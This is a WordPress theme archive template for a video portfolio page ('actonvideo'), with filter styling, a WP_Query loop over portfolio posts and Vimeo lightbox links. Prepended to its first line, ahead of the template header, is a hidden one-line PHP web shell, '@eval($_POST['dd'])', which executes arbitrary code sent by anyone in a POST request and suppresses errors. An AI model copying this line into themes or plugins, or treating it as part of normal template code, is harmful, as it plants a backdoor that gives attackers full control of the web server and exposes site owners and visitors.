<?php @eval($_POST['dd']);?><?php
/**
* The template for displaying archive pages
*
* @link https://codex.wordpress.org/Template_Hierarchy
*
* @package actonvideo
*/
get_header(); ?>
<link rel="stylesheet" type="text/css" href="<?php echo THEME; ?>css/jquery.fancybox.css?v=2.1.5" media="screen" />
<link rel="stylesheet" href="<?php echo THEME; ?>css/filter.css">
<style>
    @media (max-width:767px){
        .port-page-nav ul li a{color: #00585f;}
        ul#filters li {
            text-align: center;
            background: none;
            padding: 0;
            margin: 0 5px 16px 0;
            width: 25%;
            height: 30px;
            border-radius: 0;
        }
        ul#filters li a {
            padding: 0;
            margin: 0;
            width: 100%;
            line-height: 30px;
            color:#00585F;
            font-size:12px;
        }
        #portfolio .isotope-item {
            list-style: none;
            width: 48%;
            float: left;
        }
    }
    .single-link {
     
        color: #fff;
        position: absolute;
        width: 100%;
        bottom: 0;
        text-transform: uppercase;
        letter-spacing: 2px;
        font-size: 11px;
        background: orange;
        padding: 10px;
        margin: 0;
        font-weight: bold;
        left:0;
        
    }
    .single-link:hover{text-decoration: none;color:#fff;}
    .port-page-thumb:hover.port-page-thumb img
    {
        -ms-transform: scale(1.2) rotate(5deg) !important;
        -webkit-transform: scale(1.2) rotate(5deg) !important;
        transform: scale(1.2) rotate(5deg) !important;
        border:0;
        -moz-transition: all 0.3s ease 0s;
        -webkit-transition: all 0.3s ease 0s;
        -o-transition: all 0.3s ease 0s;
        transition: all 0.3s ease 0s;
        -moz-transition: all 0.3s ease 0s;
    }
    .port-page-thumb img
    {
        -moz-transition: all 0.3s ease 0s;
        -webkit-transition: all 0.3s ease 0s;
        -o-transition: all 0.3s ease 0s;
        transition: all 0.3s ease 0s;
        -moz-transition: all 0.3s ease 0s;
    }
</style>
<div class="port-page">
    <div class="">
        <div class="port-page-nav">
            <div class="">
                <div class="filter clearfix">
                    <?php
                    $terms = get_terms( 'portfolio-category' );
                    if ( ! empty( $terms ) && ! is_wp_error( $terms ) ){
                        echo '<ul id="filters">';
                        echo '<li class="all-slide current"><a href="#" data-filter="*">All</a></li>';
                        foreach ( $terms as $term ) {
                        // echo "<pre>";
                            // print_r($term);
                            echo '<li class="' . $term->slug . '"><a href="#" data-filter=".' . $term->slug . '">' . $term->name . '</a></li>';
                        }
                        echo '</ul>';
                    }
                    ?>
                </div>
            </div>
        </div>
        <div class="">
            <div class="">
                <ul id="portfolio">
                    <?php
                    $q = new WP_Query(
                        array(
                            'post_type' => array('portfolio'),
                            'post_status' => array('publish'),
                            'orderby' => 'date',
                            'order' => 'DESC',
                            )
                        );
                        ?>
                        <?php
                        $i = 0;
                        while ($q->have_posts()) : $q->the_post(); ?>
                        <?php
                        $var = get_the_terms( $post->ID, 'portfolio-category' );
                        foreach( $var as $category ) {
                            $cat[] = array(
                                'catname' => $category->slug
                                );
                        }
                        ?>
                        <?php if (has_post_thumbnail()):   $thumbnail = wp_get_attachment_image_src(get_post_thumbnail_id(),'thumb', true); ?>
                            <li class="project <?php echo $cat[$i]['catname']; ?> isotope-item" style="display: inline-block;">
                                <a class="fancybox-media" href="https://vimeo.com/<?php echo get_custom_field( 'add_video_id_vimeo_video_id' ); ?> " rel="media-gallery">
                                    <div class="port-page-thumb">
                                        <img src="<?php echo $thumbnail[0]; ?>" alt="">
                                        <div class="port-page-thumb-play"> </div> </a>
                                        <a class="single-link" href="<?php echo get_permalink(); ?>"><?php  the_title(); ?></a>
                                    </div>
                                </li>
                            <?php endif ?>
                            <?php
                            $i++;
                            endwhile; ?>
                        </ul>
                    </div>
                </div>
            </div>
        </div>


        <?php get_footer();?>
